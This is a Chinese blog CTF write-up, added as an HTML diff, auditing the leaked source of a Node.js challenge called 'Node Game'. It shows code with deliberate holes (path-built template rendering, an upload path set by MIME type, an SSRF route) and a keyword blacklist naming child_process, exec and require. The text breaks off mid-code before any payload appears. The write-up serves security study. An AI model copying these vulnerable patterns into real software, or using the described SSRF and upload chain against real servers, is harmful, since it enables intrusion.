@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>CTF-关于node.js题目的尝试 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CTF-关于node.js题目的尝试">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-03 11:55" pubdate>
+        2020年12月3日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      74
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CTF-关于node.js题目的尝试</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年2月28日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​        最近许多比赛，对NodeJs的语言安全知识点考察是越来越多了，由于比较少接触该语言相关题型，所以比较吃亏。所以打算做几道题目来看看，来提高关于NodeJs的代码审计能力。</p>
+<h1 id="1-Node-Game"><a href="#1-Node-Game" class="headerlink" title="1.Node Game"></a>1.Node Game</h1><p>题目环境在 <a target="_blank" rel="noopener" href="https://buuoj.cn上面有./">https://buuoj.cn上面有。</a></p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/1.png" srcset="/img/loading.gif"></p>
+<p>第一个链接是泄露了源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = express();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><br>app.use(multer(&#123;<span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span>&#125;).array(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.use(morgan(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.use(<span class="hljs-string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)))<br>app.use(<span class="hljs-string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)))<br><br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> action = req.query.action?req.query.action:<span class="hljs-string">&quot;index&quot;</span>;<br>    <span class="hljs-keyword">if</span>( action.includes(<span class="hljs-string">&quot;/&quot;</span>) || action.includes(<span class="hljs-string">&quot;\\&quot;</span>) )&#123;<br>        res.send(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>    &#125;<br>    file = path.join(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span>+ action +<span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.renderFile(file);<br>    res.send(html);<br>&#125;);<br><br>app.post(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> ip = req.connection.remoteAddress;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        msg: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ip.includes(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.msg=<span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        <span class="hljs-keyword">return</span> <br>    &#125;<br>    fs.readFile(req.files[<span class="hljs-number">0</span>].path, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>            obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.files[<span class="hljs-number">0</span>].mimetype +<span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.files[<span class="hljs-number">0</span>].originalname<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name<br>            <span class="hljs-keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.mkdirSync(__dirname + file_path)<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.msg = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>                    <span class="hljs-keyword">return</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.writeFileSync(dir_file,data)<br>                obj = &#123;<br>                    msg: <span class="hljs-string">&#x27;upload success&#x27;</span>,<br>                    filename: file_path + file_name<br>                &#125; <br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));    <br>        &#125;<br>    &#125;)<br>&#125;)<br><br>app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    res.sendFile(path.join(__dirname + <span class="hljs-string">&#x27;/template/source.txt&#x27;</span>));<br>&#125;);<br><br><br>app.get(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> q = req.query.q;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q<br>        <span class="hljs-built_in">console</span>.log(url)<br>        <span class="hljs-keyword">var</span> trigger = blacklist(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.send(<span class="hljs-string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                http.get(url, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) </span>&#123;<br>                    resp.setEncoding(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123;<br>                    <span class="hljs-keyword">if</span> (err.code === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                     <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                     <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                   &#125;);<br><br>                    resp.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) </span>&#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                         resps = chunk.toString();<br>                         res.send(resps);<br>                        &#125;<span class="hljs-keyword">catch</span> (e) &#123;<br>                           res.send(e.message);<br>                        &#125;<br> <br>                    &#125;).on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                         res.send(e.message);&#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-built_in">console</span>.log(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">url</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;mainModule&quot;</span>,<span class="hljs-string">&quot;require&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;child_process&quot;</span>,<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>];<br>    <span class="hljs-keyword">var</span> arrayLen = evilwords.length;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.includes(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> server = app.listen(<span class="hljs-number">8081</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> host = server.address().address<br>    <span class="hljs-keyword">var</span> port = server.address().port<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)<br>&#125;)<br><br></code></pre></td></tr></table></figure>
+<p>第二个链接，是一个文件上传的页面</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/2.png" srcset="/img/loading.gif"></p>
+<p>随便上传一个文件，便会提示只有<code>admin&#39;s ip</code>可以使用这个文件上传的功能。</p>
+<p><img src="/2020/12/03/CTF-%E5%85%B3%E4%BA%8Enode-js%E9%A2%98%E7%9B%AE%E7%9A%84%E5%B0%9D%E8%AF%95/3.png" srcset="/img/loading.gif"></p>
+<p>审计第一个链接泄露的源码：</p>
+<p>分成各个小块来分析：</p>
+<p>第一块可以看到是变量的初始化，一些模块的包含调用赋值。以及一些调用中间件的方法（就是处理HTTP请求的函数，用来完成各种特定的任务，比如检查用户是否登录、分析数据、以及其他在需要最终将数据<strong>发送给用户之前</strong>完成的任务。）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = express();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><br>app.use(multer(&#123;<span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span>&#125;).array(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.use(morgan(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.use(<span class="hljs-string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)))<br>app.use(<span class="hljs-string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)))<br><br></code></pre></td></tr></table></figure>
+<p>第二块是处理<code>/</code>路由，接收GET请求传来的<code>action</code>参数值，检查是否含有违法字符<code>/</code>、<code>\\</code>，而后将其拼接<code>/template</code>和<code>.pug</code>，而后赋值给<code>file</code>变量，然后用<code>pug</code>引擎渲染。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JS">app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> action = req.query.action?req.query.action:<span class="hljs-string">&quot;index&quot;</span>;<br>    <span class="hljs-keyword">if</span>( action.includes(<span class="hljs-string">&quot;/&quot;</span>) || action.includes(<span class="hljs-string">&quot;\\&quot;</span>) )&#123;<br>        res.send(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>    &#125;<br>    file = path.join(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span>+ action +<span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.renderFile(file);<br>    res.send(html);<br>&#125;);<br></code></pre></td></tr></table></figure>
+<p>第三块是处理<code>/file_upload</code>路由，接受POST请求，要使用该路由的功能对访问的ip是有限制的，只允许<code>127.0.0.1</code>的地址来访问。同时<code>var ip = req.connection.remoteAddress;</code>说明<code>ip</code>是不能通过请求头来伪造的。可以考虑用SSRF来绕过。</p>
+<p>同时如果能够使用文件上传功能的话，可以看到上传文件的存储路径是文件上传的类型<code>mimetype</code>来决定的，因此可控。</p>
+<p>文件名也是我们来控制的。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs js">app.post(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-keyword">var</span> ip = req.connection.remoteAddress;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        msg: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ip.includes(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.msg=<span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    fs.readFile(req.files[<span class="hljs-number">0</span>].path, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>            obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.files[<span class="hljs-number">0</span>].mimetype +<span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.files[<span class="hljs-number">0</span>].originalname<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name<br>            <span class="hljs-keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.mkdirSync(__dirname + file_path)<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.msg = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>                    <span class="hljs-keyword">return</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.writeFileSync(dir_file,data)<br>                obj = &#123;<br>                    msg: <span class="hljs-string">&#x27;upload success&#x27;</span>,<br>                    filename: file_path + file_name<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125;<br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>
+<p>第三块是<code>/core</code>路由和<code>blacklist</code>函数，从网上查阅的wp来看，这一块就是SSRF的点了。NodeJs8.12.0这个版本在http模块这里是有漏洞的。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
+<p>可以利用请求走私来达到SSRF效果</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js">app.get(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> q = req.query.q;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q<br>   